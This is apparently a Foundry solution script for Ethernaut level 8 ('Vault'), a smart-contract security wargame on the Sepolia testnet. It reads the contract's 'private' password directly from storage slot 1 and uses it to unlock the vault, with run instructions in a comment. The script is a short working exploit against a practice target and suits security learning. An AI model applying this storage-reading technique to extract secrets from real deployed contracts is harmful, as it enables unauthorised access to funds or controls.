// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Vault.sol";

/*
    Solution script for the Ethernaut Level 8: Vault

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in VaultScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Vault.s.sol:VaultScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Vault.s.sol/11155111
*/

contract VaultScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0xC1a409dA15aEbf922b01121D39cC8a9296916b8d;
    Vault public level8 = Vault(instance);

    function run() external {
        vm.startBroadcast();

        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));

        level8.unlock(password);

        require(!level8.locked(), "Vault still locked so revert");

        vm.stopBroadcast();
    }
}